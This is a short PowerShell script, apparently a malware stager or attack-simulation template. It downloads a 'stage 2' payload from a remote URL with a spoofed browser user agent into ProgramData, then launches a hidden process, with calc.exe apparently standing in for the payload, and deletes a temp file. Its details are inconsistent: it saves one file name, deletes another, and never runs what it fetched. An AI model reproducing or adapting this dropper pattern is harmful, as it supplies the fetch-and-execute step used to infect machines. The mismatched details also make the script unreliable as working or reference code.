
[CmdletBinding()]
param(
    [string]$Stage2Url = 'https://internal.corp/update.dat',
    [string]$OutputPath = 'C:\ProgramData\stage1.bin',
    [int]$TimeoutSec = 33,
    [string]$UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
)
$ErrorActionPreference = "Stop"

function Invoke-PayloadFetch {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = "",
        [string]$DestinationPath = "",
        [int]$TimeoutSec = 45,
        [string]$UserAgent = "Mozilla/5.0"
    )

    Write-Verbose ("Requesting " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("User-Agent", $UserAgent)
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

Write-Verbose "Starting stage 2 transfer"
$ResultObject = Invoke-PayloadFetch -SourceUrl $Stage2Url -DestinationPath $OutputPath -TimeoutSec $TimeoutSec -UserAgent $UserAgent
if ($ResultObject) {
    Start-Process -FilePath "calc.exe" -WindowStyle Hidden
}

Remove-Item -Path "$env:TEMP\stage2.bin" -Force
Set-Location -Path $env:TEMP
